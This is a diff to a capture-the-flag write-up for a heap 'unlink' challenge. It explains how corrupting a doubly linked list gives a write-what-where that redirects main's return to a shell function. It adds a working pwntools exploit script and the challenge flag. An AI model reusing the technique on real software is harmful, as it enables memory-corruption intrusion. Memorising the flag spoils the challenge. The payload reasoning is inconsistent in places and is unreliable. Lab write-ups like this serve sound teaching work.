@@ -3,68 +3,7 @@
 How much can you control memory with unlink corruption?
 ```
 ---
-Source code:
-```C
-// gcc -o unlink unlink.c -m32 -fno-stack-protector -no-pie  
-#include <stdio.h>  
-#include <stdlib.h>  
-#include <string.h>  
-#include <unistd.h>  
-  
-typedef struct tagOBJ{  
-    struct tagOBJ* fd;  
-    struct tagOBJ* bk;  
-    char buf[8];  
-}OBJ;  
-  
-void shell(){  
-    setregid(getegid(), getegid());  
-    system("/bin/sh");  
-}  
-  
-void unlink(OBJ* P){  
-    OBJ* BK;  
-    OBJ* FD;  
-    BK=P->bk;  
-    FD=P->fd;  
-    FD->bk=BK;  
-    BK->fd=FD;  
-}  
-int main(int argc, char* argv[]){  
-    malloc(2048);  
-    OBJ* A = (OBJ*)malloc(sizeof(OBJ));  
-    OBJ* B = (OBJ*)malloc(sizeof(OBJ));  
-    OBJ* C = (OBJ*)malloc(sizeof(OBJ));  
-  
-    // double linked list: A <-> B <-> C  
-    A->fd = B;  
-    B->bk = A;  
-    B->fd = C;  
-    C->bk = B;  
-  
-    printf("here is stack address leak: %p\n", &A);  
-    printf("here is heap address leak: %p\n", A);  
-    printf("now that you have leaks, get shell!\n");  
-    // heap overflow!  
-    gets(A->buf);  
-  
-    // exploit this unlink!  
-    unlink(B);  
-    return 0;  
-}
-```
-
-We are hinted to overflow the heap, so I first made a sketch of what the heap supposedly looks like and went over the `unlink` function with normal input - I understood it just makes A point to C at its `fd`, and C point to A at its `bk`. As expected. Heap:
-
-| A start |     |     |     | B start |     |     |     | C start |     |     |     |
-| ------- | --- | --- | --- | ------- | --- | --- | --- | ------- | --- | --- | --- |
-| 4       | 4   | 8   | 8?  | 4       | 4   | 8   | 8?  | 4       | 4   | 8   | 8?  |
-| B*      | N   | b   | M   | C*      | A*  | b   | M   | N       | B*  | b   | M   |
-Where:
-- A*, B*, C* are addresses to the object on the heap
-- N is unusued value (junk)
-- b is the buffer from the struct
-- M is `malloc` metadata
+We are hinted to overflow the heap, so I first made a sketch of what the heap supposedly looks like and went over the `unlink` function with normal input - I understood it just makes A point to C at its `fd`, and C point to A at its `bk`. As expected. 
 
 We can override those pointer values to whatever we want. I first thought of how I can use the address of the `shell` function (static, with `readelf`: `0x080491d6`) - 
 The problem is that if we overwrite either A* or C* in B to make the return address be the shell function, the `unlink` function will have to write to the shell function.
@@ -82,27 +21,27 @@ Looking at this `main` segment after the call to the `unlink` function:
 .text:08049336 lea     esp, [ecx-4]
 .text:08049339 retn
 ```
-It seems like it is loaded to `esp` (meaning the stack pointer points to it), then we pop its value into `ecx`, and at the second to last line, it moves `esp` to `$ecx-4`?? What is this? Seems like we have found the value we could overwrite to - as the `main` function returns to whatever is pointed by `$ecx -4`. Therefore, we'd need to make `$ebx - 8` hold `&shell + 4`.
+It seems like it is loaded to `esp` (meaning the stack pointer points to it), then we pop its value into `ecx`, and at the second to last line, it moves `esp` to `$ecx-4`?? What is this? Seems like we have found the value we could overwrite to - as the `main` function returns to whatever is pointed by `$ecx -4`. Therefore, we'd need to make `$ebx - 8` hold `&shell`.
 
 
-#### Overriding the heap 
+#### Overwriting the heap 
 Before overwriting this is how the heap and stack look like this;
 Heap:
 
 | A start |      |     |     | B start |     |     |     | C start |     |     |     |
 | ------- | ---- | --- | --- | ------- | --- | --- | --- | ------- | --- | --- | --- |
-| 4       | 4    | 8   | 8?  | 4       | 4   | 8   | 8?  | 4       | 4   | 8   | 8?  |
+| 4       | 4    | 8   | 16  | 4       | 4   | 8   | 16  | 4       | 4   | 8   | 8?  |
 | &B      | ---- | b   | --- | &C      | &A  | b   | --- | ---     | &B  | b   | --- |
-(&N = address on heap, b = buffer, --- = IDC - unallocated/ `malloc` chunk metadata)
+(&N = address on heap, b = buffer, --- = IDC - unallocated/ `malloc` chunk metadata - size is platform dependent)
 Stack:
 
 | ebp+4    | &main    |               |
 | -------- | -------- | ------------- |
 | ebp      | &ebp     |               |
 | ebp - 4  | OVERRIDE | Future return |
-| ebp - 8  | &A       | != &A heap    |
-| ebp - 0C | &B       | ""            |
-| EBP -10  | &C       | ""            |
+| ebp - 8  | &C       |               |
+| ebp - 0C | &B       |               |
+| EBP -10  | &A       |               |
 |          |          |               |
 
 We control `&A+8` and forwards --->
@@ -110,34 +49,56 @@ That means we can use the logic of `unlink` to our advantage and make `$ebp-4` p
 
 ```C
 # Logic happening inside `unlink` regarding this heap example
-*(*(&B)+4) = *((&B+4));
-*((&B+4)) = *(&B);
+# Seems a bit unclear unless you read the assembly
+1. *(*(&B)+4) = *((&B+4));
+2. *((&B+4)) = *(&B);
 
-/** After override we want to achieve this;
- * 1. &B = &A+8; 
- *	Where &A+8 = &shell+4 (+4 for `&ecx-4` jump),
- *	Also because we use the +4 to make sure our return address doesn't get ovewritten later. We can use other addresses as well with this logic.
- *
- * 2. &B+4 = $ebp-4
-*/
-*(&A+8+4) = *(&ebp-4);
-*(&ebp-4) = *(&A+8);
+/**
+ * After overwrite we want to achieve this;
+ * 1. B->fd = $ebp-8
+ * 2. B->bk = &A->buf+4
+ * Because:
+ */
+1. *($ebp-4) = *(&A->buf+4);
+2. *(&A->buf+4) = *($ebp-4);
 ```
 
 
 Applying this logic, we need to input the following to `gets`:
 ```python
-python2 -c 'print "&shell+4" + "A" * 12 + "&A<heap>+8" + "&A<stack>+4"
+python2 -c 'print "&shell" + "A" * 12 + "&A+{offset_to_ebp-4}>" + "A->buf+4"
 ```
 
 Let's write it with `pwntools`:
 
 ```python
-
+from pwn import *  
+  
+SHELL = 0x080491d6  # readelf -a | grep shell  
+PATTERN = re.compile(rb"0x[^\n]+")  
+  
+context.log_level = "debug"  
+get_address = lambda: int(PATTERN.search(p.recvline()).group(0), 16)  
+  
+p = process("/home/unlink/unlink")  
+# Receive initial 3 lines  
+a_stack, a_heap, _ = get_address(), get_address(), p.recvline()  
+print(f"Stack: {a_stack:#x}, heap: {a_heap:#x}")  
+  
+ebp_4 = a_stack + 8  
+a_buf = a_heap + 8  
+  
+p.sendline(  
+    p32(SHELL) +  
+    b"A" * 20 +  
+    p32(ebp_4) +  
+    p32(a_buf + 4)  
+)  
+p.interactive()
 ```
 
 
 # Flag
 ```
-
+wr1te_what3ver_t0_4nywh3re
 ```
